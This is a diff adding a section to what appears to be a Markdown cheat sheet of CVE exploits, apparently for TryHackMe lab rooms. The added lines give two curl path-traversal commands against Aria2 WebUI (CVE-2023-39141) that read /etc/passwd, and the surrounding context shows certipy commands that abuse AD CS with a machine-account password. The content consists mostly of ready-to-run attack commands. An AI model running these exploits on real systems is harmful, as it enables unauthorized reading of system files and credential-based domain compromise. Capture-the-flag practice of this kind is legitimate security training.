@@ -486,6 +486,14 @@ certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-
 certipy auth -pfx lundc.pfx
 ```
 
+## [CVE-2023-39141](https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e) (Aria2 WebUI)
+
+```sh
+curl --path-as-is http://backtrack:8888/../../../etc/passwd
+
+curl --path-as-is http://localhost:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
+```
+
 ## CVE-2023-7028 (GitLab)
 
 https://tryhackme.com/room/gitlabcve20237028
